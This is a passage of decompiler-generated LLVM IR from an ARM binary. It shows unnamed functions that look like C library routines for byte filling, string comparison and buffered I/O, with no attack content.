  %v0_edf4 = load i32, i32* @r5, align 4
  %v1_edf4 = urem i32 %v0_edf4, 256
  store i32 %v1_edf4, i32* %r1.global-to-local, align 4
  %v1_edf8 = trunc i32 %v0_edf4 to i8
  %v3_edf8 = inttoptr i32 %v3_edf0 to i8*
  store i8 %v1_edf8, i8* %v3_edf8, align 1
  %v4_edf8 = load i32, i32* %r2.global-to-local, align 4
  %v5_edf8 = add i32 %v4_edf8, 1
  store i32 %v5_edf8, i32* %r2.global-to-local, align 4
  %v0_edfc = load i32, i32* @r4, align 4
  %v1_edfc = add i32 %v0_edfc, 1
  %v2_edfc = inttoptr i32 %v1_edfc to i8*
  %v3_edfc = load i8, i8* %v2_edfc, align 1
  %v4_edfc = zext i8 %v3_edfc to i32
  store i32 %v4_edfc, i32* %r3.global-to-local, align 4
  %tmp12 = urem i8 %v3_edfc, 2
  %v2_ee00 = icmp eq i8 %tmp12, 0
  %v2_ee04 = add i32 %v0_edfc, 16
  %v3_ee04 = inttoptr i32 %v2_ee04 to i32*
  store i32 %v5_edf8, i32* %v3_ee04, align 4
  br i1 %v2_ee00, label %dec_label_pc_ee54, label %dec_label_pc_ee0c

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_edf0
  %v0_ee0c = load i32, i32* %r1.global-to-local, align 4
  %v2_ee0c = icmp ugt i32 %v0_ee0c, 9
  store i1 %v2_ee0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee0c = icmp eq i32 %v0_ee0c, 10
  br i1 %v7_ee0c, label %dec_label_pc_ee14, label %dec_label_pc_ee54

dec_label_pc_ee14:                                ; preds = %dec_label_pc_ee0c
  %v0_ee14 = load i32, i32* @r4, align 4
  store i32 %v0_ee14, i32* @r0, align 4
  %v0_ee18 = call i32 @function_d8c8()
  store i32 %v0_ee18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee1c = icmp eq i32 %v0_ee18, 0
  br i1 %v2_ee1c, label %dec_label_pc_ee54, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %dec_label_pc_ee14
  %v0_ee24 = load i32, i32* @r4, align 4
  %v1_ee24 = add i32 %v0_ee24, 16
  %v2_ee24 = inttoptr i32 %v1_ee24 to i32*
  %v3_ee24 = load i32, i32* %v2_ee24, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_ee2c = add i32 %v3_ee24, -1
  store i32 %v1_ee2c, i32* %r3.global-to-local, align 4
  store i32 %v1_ee2c, i32* %v2_ee24, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ee38:                                ; preds = %dec_label_pc_edc4
  %v0_ee3c = load i32, i32* @r5, align 4
  %v6_ee3c = trunc i32 %v0_ee3c to i8
  store i8 %v6_ee3c, i8* %stack_var_-13, align 1
  %v9_ee3c = ptrtoint i8* %stack_var_-13 to i32
  store i32 %v9_ee3c, i32* %r1.global-to-local, align 4
  %v1_ee40 = inttoptr i32 %v0_edb8 to i8*
  store i32 %v0_edb8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ee48 = call i32 @function_11684(i8* %v1_ee40, i32 %v9_ee3c, i32 1)
  store i32 %v5_ee48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee4c = icmp eq i32 %v5_ee48, 0
  br i1 %v2_ee4c, label %dec_label_pc_ee5c, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee0c, %dec_label_pc_ee38, %dec_label_pc_ee14, %dec_label_pc_edf0, %dec_label_pc_edb8
  %v0_ee54 = load i32, i32* @r5, align 4
  %v1_ee54 = urem i32 %v0_ee54, 256
  store i32 %v1_ee54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ee5c:                                ; preds = %dec_label_pc_ede0, %dec_label_pc_eda4, %dec_label_pc_ee38
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ee60:                                ; preds = %.thread2, %dec_label_pc_ee54, %dec_label_pc_ee24, %dec_label_pc_ee5c
  %v2_ee64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ee64, i32* @r4, align 4
  store i32 %v6_ed64, i32* @r5, align 4
  %v11_ee64 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_ee64

; uselistorder directives
  uselistorder i32 %v0_ee0c, { 1, 0 }
  uselistorder i32 %v0_edf4, { 1, 0 }
  uselistorder i32 %v0_edb8, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_ed7c, { 1, 0, 2 }
  uselistorder i8* %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 2, 3, 12, 4, 5, 6, 7, 11, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_ee60, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_ee5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ee54, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_ed94, { 1, 0 }
}

define i32 @function_ee68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ee68:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ee68 = load i32, i32* @r4, align 4
  store i32 %v3_ee68, i32* %stack_var_-16, align 4
  %v6_ee68 = load i32, i32* @r5, align 4
  %v9_ee68 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_ee74 = call i32 @function_f030()
  store i32 %v0_ee74, i32* @r6, align 4
  %v0_ee7c = load i32, i32* @r5, align 4
  %v0_ee80 = load i32, i32* @r4, align 4
  %v4_ee8c = inttoptr i32 %v0_ee7c to i8*
  %v5_ee8c = call i32 @function_ee9c(i32 %v0_ee80, i32 1, i32 %v0_ee74, i8* %v4_ee8c)
  %v1_ee90 = load i32, i32* @r6, align 4
  %v9_ee90 = icmp eq i32 %v5_ee8c, %v1_ee90
  br i1 %v9_ee90, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_ee68
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_ee68, %bb
  %v14_ee98 = phi i32 [ %v5_ee8c, %dec_label_pc_ee68 ], [ -1, %bb ]
  %v2_ee98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ee98, i32* @r4, align 4
  store i32 %v6_ee68, i32* @r5, align 4
  store i32 %v9_ee68, i32* @r6, align 4
  ret i32 %v14_ee98

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_ee9c(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
dec_label_pc_ee9c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_ee9c = load i32, i32* @r6, align 4
  %v12_ee9c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_eea4 = load i8, i8* %arg4, align 1
  %v4_eea4 = zext i8 %v3_eea4 to i32
  %v1_eea8 = and i32 %v4_eea4, 192
  store i32 %v1_eea8, i32* %r3.global-to-local, align 4
  %v2_eeac = icmp eq i32 %v1_eea8, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_eeac, label %dec_label_pc_eed4, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ee9c
  %v4_eec8 = call i32 @function_11878(i8* nonnull %arg4, i32 128)
  %v2_eecc = icmp eq i32 %v4_eec8, 0
  br i1 %v2_eecc, label %dec_label_pc_eec8.dec_label_pc_eed4_crit_edge, label %dec_label_pc_ef3c

dec_label_pc_eec8.dec_label_pc_eed4_crit_edge:    ; preds = %dec_label_pc_eec8
  %v0_eed4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_eec8.dec_label_pc_eed4_crit_edge, %dec_label_pc_ee9c
  %v0_eedc1 = phi i32 [ %v0_eed4.pre, %dec_label_pc_eec8.dec_label_pc_eed4_crit_edge ], [ %arg2, %dec_label_pc_ee9c ]
  %v2_eed4 = icmp eq i32 %v0_eedc1, 0
  br i1 %v2_eed4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_eed4
  br label %dec_label_pc_ef3c

bb:                                               ; preds = %dec_label_pc_eed4
  %v1_eed8 = load i32, i32* @r6, align 4
  %v3_eed8 = icmp eq i32 %v1_eed8, 0
  store i32 %v0_eedc1, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  br i1 %v3_eed8, label %dec_label_pc_ef3c, label %dec_label_pc_eee8

dec_label_pc_eee8:                                ; preds = %bb
  %v0_eee8 = call i32 @function_14d90()
  %v0_eeec = load i32, i32* @r6, align 4
  %v0_eef0 = load i32, i32* @r4, align 4
  store i32 %v0_eef0, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v0_eeec, %v0_eee8
  br i1 %tmp10, label %dec_label_pc_ef14, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eee8
  %v0_eef4 = load i32, i32* @r7, align 4
  %v1_eefc = load i32, i32* @r5, align 4
  %v2_eefc = mul i32 %v1_eefc, %v0_eeec
  %v4_ef00 = call i32 @function_11740(i32 %v0_eef4, i32 %v2_eefc, i32 %v0_eef0)
  store i32 %v4_ef00, i32* @r0, align 4
  %v0_ef04 = load i32, i32* @r5, align 4
  store i32 %v0_ef04, i32* @r1, align 4
  %v0_ef08 = call i32 @function_14d90()
  store i32 %v0_ef08, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eee8
  %v1_ef14 = inttoptr i32 %v0_eef0 to i32*
  %v2_ef14 = load i32, i32* %v1_ef14, align 4
  %v1_ef18 = or i32 %v2_ef14, 8
  store i32 %v1_ef18, i32* %r3.global-to-local, align 4
  %v3_ef1c = sdiv i32 %v2_ef14, 256
  store i32 %v3_ef1c, i32* %r2.global-to-local, align 4
  %v1_ef20 = trunc i32 %v3_ef1c to i8
  %v3_ef20 = add i32 %v0_eef0, 1
  %v4_ef20 = inttoptr i32 %v3_ef20 to i8*
  store i8 %v1_ef20, i8* %v4_ef20, align 1
  %v0_ef24 = load i32, i32* %r3.global-to-local, align 4
  %v1_ef24 = trunc i32 %v0_ef24 to i8
  %v2_ef24 = load i32, i32* @r4, align 4
  %v3_ef24 = inttoptr i32 %v2_ef24 to i8*
  store i8 %v1_ef24, i8* %v3_ef24, align 1
  %v0_ef28 = call i32 @function_cec4()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ef34 = inttoptr i32 %v0_ef28 to i32*
  store i32 22, i32* %v2_ef34, align 4
  %v0_ef40.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef3c:                                ; preds = %.thread, %dec_label_pc_eec8, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef14, %dec_label_pc_eefc, %dec_label_pc_ef3c
  %v0_ef40 = phi i32 [ %v0_ef40.pre, %dec_label_pc_ef14 ], [ %v0_ef08, %dec_label_pc_eefc ], [ 0, %dec_label_pc_ef3c ]
  store i32 %v9_ee9c, i32* @r6, align 4
  store i32 %v12_ee9c, i32* @r7, align 4
  ret i32 %v0_ef40

; uselistorder directives
  uselistorder i32 %v3_ef1c, { 1, 0 }
  uselistorder i32 %v0_eeec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11740, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_11878, { 1, 0 }
  uselistorder label %dec_label_pc_ef40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef3c, { 2, 0, 1 }
}

define i32 @function_ef48(i32 %arg1) local_unnamed_addr {
dec_label_pc_ef48:
  ret i32 %arg1
}

define i32 @function_ef50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ef50:
  %v2_ef5c = inttoptr i32 %arg2 to i8*
  %v3_ef5c = call i32 @function_12310(i8* %v2_ef5c, i32 %arg1)
  ret i32 %v3_ef5c
}

define i32 @function_ef60() local_unnamed_addr {
dec_label_pc_ef60:
  %v0_ef60 = load i32, i32* @r0, align 4
  %v1_ef60 = load i32, i32* @r1, align 4
  %v2_ef60 = inttoptr i32 %v0_ef60 to i8*
  %v3_ef60 = call i32 @function_12310(i8* %v2_ef60, i32 %v1_ef60)
  ret i32 %v3_ef60
}

define i32 @function_ef70(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ef70:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_ef74 = load i32, i32* @r2, align 4
  %v8_ef74 = icmp eq i32 %v0_ef74, 8
  store i1 %v8_ef74, i1* %cpsr_z.global-to-local, align 1
  %v5_ef78 = icmp slt i32 %v0_ef74, 8
  br i1 %v5_ef78, label %dec_label_pc_efd8, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef70
  %v4_ef7c = mul i32 %arg2, 256
  %v5_ef7c = or i32 %v4_ef7c, %arg2
  %v4_ef80 = mul i32 %v5_ef7c, 65536
  %v5_ef80 = or i32 %v4_ef80, %v5_ef7c
  store i32 %v5_ef80, i32* %r1.global-to-local, align 4
  %v1_ef8457 = urem i32 %tmp, 4
  %v2_ef8458 = icmp eq i32 %v1_ef8457, 0
  store i1 %v2_ef8458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ef8458, label %dec_label_pc_ef94, label %bb

bb:                                               ; preds = %dec_label_pc_ef7c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_ef7c ]
  %v3_ef8859 = phi i32 [ %v6_ef88, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_ef7c ]
  %v4_ef88 = inttoptr i32 %v3_ef8859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ef88, align 1
  %v5_ef88 = load i32, i32* %r3.global-to-local, align 4
  %v6_ef88 = add i32 %v5_ef88, 1
  store i32 %v6_ef88, i32* %r3.global-to-local, align 4
  %v0_ef8c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ef98.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_ef8c.pr, label %dec_label_pc_ef94, label %.thread

.thread:                                          ; preds = %bb
  %v2_ef8c = add i32 %v0_ef98.pr.pre, -1
  store i32 %v2_ef8c, i32* @r2, align 4
  %v1_ef84 = urem i32 %v6_ef88, 4
  %v2_ef84 = icmp eq i32 %v1_ef84, 0
  store i1 %v2_ef84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef84, label %dec_label_pc_ef94, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ef88.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ef88.pre to i8
  br label %bb

dec_label_pc_ef94:                                ; preds = %.thread, %bb, %dec_label_pc_ef7c
  %v0_efa028 = phi i32 [ %tmp, %dec_label_pc_ef7c ], [ %v6_ef88, %bb ], [ %v6_ef88, %.thread ]
  %v0_ef98.pr = phi i32 [ %v0_ef74, %dec_label_pc_ef7c ], [ %v0_ef98.pr.pre, %bb ], [ %v2_ef8c, %.thread ]
  %v0_ef94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ef94, i32* @ip, align 4
  %v8_ef9810 = icmp eq i32 %v0_ef98.pr, 8
  store i1 %v8_ef9810, i1* %cpsr_z.global-to-local, align 1
  %v5_ef9c11 = icmp slt i32 %v0_ef98.pr, 8
  br i1 %v5_ef9c11, label %dec_label_pc_efd8, label %dec_label_pc_efa0.preheader

dec_label_pc_efa0.preheader:                      ; preds = %dec_label_pc_ef94
  %v1_efa046 = inttoptr i32 %v0_efa028 to i32*
  store i32 %v0_ef94, i32* %v1_efa046, align 4
  %v3_efa047 = add i32 %v0_efa028, 4
  %v4_efa048 = inttoptr i32 %v3_efa047 to i32*
  %v5_efa049 = load i32, i32* @ip, align 4
  store i32 %v5_efa049, i32* %v4_efa048, align 4
  %v6_efa050 = add i32 %v0_efa028, 8
  store i32 %v6_efa050, i32* %r3.global-to-local, align 4
  %v0_efa451 = load i32, i32* @r2, align 4
  %v1_efa452 = add i32 %v0_efa451, -8
  store i32 %v1_efa452, i32* %r2.global-to-local, align 4
  %v5_efac53 = icmp slt i32 %v1_efa452, 8
  br i1 %v5_efac53, label %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %dec_label_pc_efa0.preheader, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge
  %v6_efa055 = phi i32 [ %v6_efa0, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge ], [ %v6_efa050, %dec_label_pc_efa0.preheader ]
  %v0_efa054 = phi i32 [ %v12_efcc, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge ], [ %v0_efa028, %dec_label_pc_efa0.preheader ]
  %v1_efb0 = inttoptr i32 %v6_efa055 to i32*
  %v2_efb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_efb0, i32* %v1_efb0, align 4
  %v3_efb0 = add i32 %v0_efa054, 12
  %v4_efb0 = inttoptr i32 %v3_efb0 to i32*
  %v5_efb0 = load i32, i32* @ip, align 4
  store i32 %v5_efb0, i32* %v4_efb0, align 4
  %v6_efb0 = add i32 %v0_efa054, 16
  store i32 %v6_efb0, i32* %r3.global-to-local, align 4
  %v0_efb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efb4 = add i32 %v0_efb4, -8
  store i32 %v1_efb4, i32* %r2.global-to-local, align 4
  %v5_efbc = icmp slt i32 %v1_efb4, 8
  br i1 %v5_efbc, label %dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_efc0

dec_label_pc_efc0:                                ; preds = %dec_label_pc_efb0
  %v1_efc0 = inttoptr i32 %v6_efb0 to i32*
  %v2_efc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_efc0, i32* %v1_efc0, align 4
  %v3_efc0 = add i32 %v0_efa054, 20
  %v4_efc0 = inttoptr i32 %v3_efc0 to i32*
  %v5_efc0 = load i32, i32* @ip, align 4
  store i32 %v5_efc0, i32* %v4_efc0, align 4
  %v6_efc0 = add i32 %v0_efa054, 24
  store i32 %v6_efc0, i32* %r3.global-to-local, align 4
  %v0_efc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efc4 = add i32 %v0_efc4, -8
  store i32 %v1_efc4, i32* %r2.global-to-local, align 4
  %v5_efcc = icmp slt i32 %v1_efc4, 8
  br i1 %v5_efcc, label %dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %dec_label_pc_efc0
  %v7_efcc = inttoptr i32 %v6_efc0 to i32*
  %v8_efcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_efcc, i32* %v7_efcc, align 4
  %v9_efcc = add i32 %v0_efa054, 28
  %v10_efcc = inttoptr i32 %v9_efcc to i32*
  %v11_efcc = load i32, i32* @ip, align 4
  store i32 %v11_efcc, i32* %v10_efcc, align 4
  %v12_efcc = add i32 %v0_efa054, 32
  store i32 %v12_efcc, i32* %r3.global-to-local, align 4
  %v6_efd0 = load i32, i32* %r2.global-to-local, align 4
  %v7_efd0 = add i32 %v6_efd0, -8
  store i32 %v7_efd0, i32* %r2.global-to-local, align 4
  %v5_ef9c = icmp slt i32 %v7_efd0, 8
  br i1 %v5_ef9c, label %dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge

dec_label_pc_ef98.dec_label_pc_efa0_crit_edge:    ; preds = %dec_label_pc_ef98
  %v2_efa0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_efa0 = inttoptr i32 %v12_efcc to i32*
  store i32 %v2_efa0.pre, i32* %v1_efa0, align 4
  %v3_efa0 = add i32 %v0_efa054, 36
  %v4_efa0 = inttoptr i32 %v3_efa0 to i32*
  %v5_efa0 = load i32, i32* @ip, align 4
  store i32 %v5_efa0, i32* %v4_efa0, align 4
  %v6_efa0 = add i32 %v0_efa054, 40
  store i32 %v6_efa0, i32* %r3.global-to-local, align 4
  %v0_efa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efa4 = add i32 %v0_efa4, -8
  store i32 %v1_efa4, i32* %r2.global-to-local, align 4
  %v5_efac = icmp slt i32 %v1_efa4, 8
  br i1 %v5_efac, label %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_efb0

dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge, %dec_label_pc_efa0.preheader
  %v1_efa4.lcssa = phi i32 [ %v1_efa452, %dec_label_pc_efa0.preheader ], [ %v1_efa4, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_ef98
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_efb0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_efc0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_ef94, %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_ef70
  %v0_efe0 = phi i32 [ %v0_ef74, %dec_label_pc_ef70 ], [ %v1_efc4, %dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge ], [ %v1_efb4, %dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge ], [ %v7_efd0, %dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge ], [ %v1_efa4.lcssa, %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge ], [ %v0_ef98.pr, %dec_label_pc_ef94 ]
  %v2_efd8 = icmp eq i32 %v0_efe0, 0
  store i1 %v2_efd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efd8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_efd8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_efd8
  %v1_efe0 = sub i32 7, %v0_efe0
  store i32 %v1_efe0, i32* %r2.global-to-local, align 4
  %v3_efe4 = mul i32 %v1_efe0, 4
  %v4_efe4 = add i32 %v3_efe4, ptrtoint (i32* @global_var_efec.411 to i32)
  call void @__pseudo_branch(i32 %v4_efe4)
  %v0_efec = load i32, i32* %r1.global-to-local, align 4
  %v1_efec = trunc i32 %v0_efec to i8
  %v2_efec = load i32, i32* %r3.global-to-local, align 4
  %v3_efec = inttoptr i32 %v2_efec to i8*
  store i8 %v1_efec, i8* %v3_efec, align 1
  %v4_efec = load i32, i32* %r3.global-to-local, align 4
  %v5_efec = add i32 %v4_efec, 1
  store i32 %v5_efec, i32* %r3.global-to-local, align 4
  %v0_eff0 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff0 = trunc i32 %v0_eff0 to i8
  %v3_eff0 = inttoptr i32 %v5_efec to i8*
  store i8 %v1_eff0, i8* %v3_eff0, align 1
  %v4_eff0 = load i32, i32* %r3.global-to-local, align 4
  %v5_eff0 = add i32 %v4_eff0, 1
  store i32 %v5_eff0, i32* %r3.global-to-local, align 4
  %v0_eff4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff4 = trunc i32 %v0_eff4 to i8
  %v3_eff4 = inttoptr i32 %v5_eff0 to i8*
  store i8 %v1_eff4, i8* %v3_eff4, align 1
  %v4_eff4 = load i32, i32* %r3.global-to-local, align 4
  %v5_eff4 = add i32 %v4_eff4, 1
  store i32 %v5_eff4, i32* %r3.global-to-local, align 4
  %v0_eff8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff8 = trunc i32 %v0_eff8 to i8
  %v3_eff8 = inttoptr i32 %v5_eff4 to i8*
  store i8 %v1_eff8, i8* %v3_eff8, align 1
  %v4_eff8 = load i32, i32* %r3.global-to-local, align 4
  %v5_eff8 = add i32 %v4_eff8, 1
  store i32 %v5_eff8, i32* %r3.global-to-local, align 4
  %v0_effc = load i32, i32* %r1.global-to-local, align 4
  %v1_effc = trunc i32 %v0_effc to i8
  %v3_effc = inttoptr i32 %v5_eff8 to i8*
  store i8 %v1_effc, i8* %v3_effc, align 1
  %v4_effc = load i32, i32* %r3.global-to-local, align 4
  %v5_effc = add i32 %v4_effc, 1
  store i32 %v5_effc, i32* %r3.global-to-local, align 4
  %v0_f000 = load i32, i32* %r1.global-to-local, align 4
  %v1_f000 = trunc i32 %v0_f000 to i8
  %v3_f000 = inttoptr i32 %v5_effc to i8*
  store i8 %v1_f000, i8* %v3_f000, align 1
  %v4_f000 = load i32, i32* %r3.global-to-local, align 4
  %v5_f000 = add i32 %v4_f000, 1
  store i32 %v5_f000, i32* %r3.global-to-local, align 4
  %v0_f004 = load i32, i32* %r1.global-to-local, align 4
  %v1_f004 = trunc i32 %v0_f004 to i8
  %v3_f004 = inttoptr i32 %v5_f000 to i8*
  store i8 %v1_f004, i8* %v3_f004, align 1
  %v4_f004 = load i32, i32* %r3.global-to-local, align 4
  %v5_f004 = add i32 %v4_f004, 1
  store i32 %v5_f004, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_efa0, { 1, 0 }
  uselistorder i32 %v12_efcc, { 1, 2, 0 }
  uselistorder i32 %v0_efa054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_ef98.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ef88, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_ef7c, { 1, 0 }
  uselistorder i32 %v0_ef74, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 20, 19, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 2, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 5, 2, 1, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_efd8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_efb0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f010(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_f014.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f010

dec_label_pc_f010:                                ; preds = %bb3, %bb
  %v0_f014 = phi i32 [ %v0_f014.pre, %bb ], [ %v5_f014, %bb3 ]
  %v0_f010 = phi i32 [ %tmp, %bb ], [ %v5_f010, %bb3 ]
  %v1_f010 = inttoptr i32 %v0_f010 to i8*
  %v2_f010 = load i8, i8* %v1_f010, align 1
  %v1_f014 = inttoptr i32 %v0_f014 to i8*
  %v2_f014 = load i8, i8* %v1_f014, align 1
  %v3_f014 = zext i8 %v2_f014 to i32
  %v2_f018 = icmp eq i8 %v2_f010, 0
  br i1 %v2_f018, label %.dec_label_pc_f024_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_f010
  %v5_f014 = add i32 %v0_f014, 1
  %v5_f010 = add i32 %v0_f010, 1
  %v3_f010 = zext i8 %v2_f010 to i32
  %v10_f01c = icmp eq i8 %v2_f010, %v2_f014
  br i1 %v10_f01c, label %dec_label_pc_f010, label %dec_label_pc_f024

.dec_label_pc_f024_crit_edge:                     ; preds = %dec_label_pc_f010
  br label %dec_label_pc_f024

